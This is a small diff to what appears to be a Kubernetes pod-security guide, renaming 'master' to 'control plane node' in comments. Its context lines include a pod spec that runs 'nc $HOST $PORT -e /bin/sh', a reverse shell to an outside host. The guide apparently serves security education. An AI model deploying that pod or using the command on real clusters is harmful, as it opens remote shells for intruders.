@@ -19,8 +19,8 @@ spec:
     image: ubuntu
     command: [ "/bin/bash", "-c", "--" ]
     args: [ "while true; do sleep 30; done;" ]
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
 ```
 [pod-nothing-allowed.yaml](pod-nothing-allowed.yaml)
 
@@ -53,8 +53,8 @@ spec:
     image: busybox
     command: [ "/bin/sh", "-c", "--" ]
     args: [ "nc $HOST $PORT  -e /bin/sh;" ]
-  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
-  #nodeName: k8s-master
+  # Force scheduling of your pod on control plane node by uncommenting this line and changing the name
+  #nodeName: k8s-control-plane-node
 ```
 [pod-nothing-allowed-revshell.yaml](pod-nothing-allowed-revshell.yaml)
 
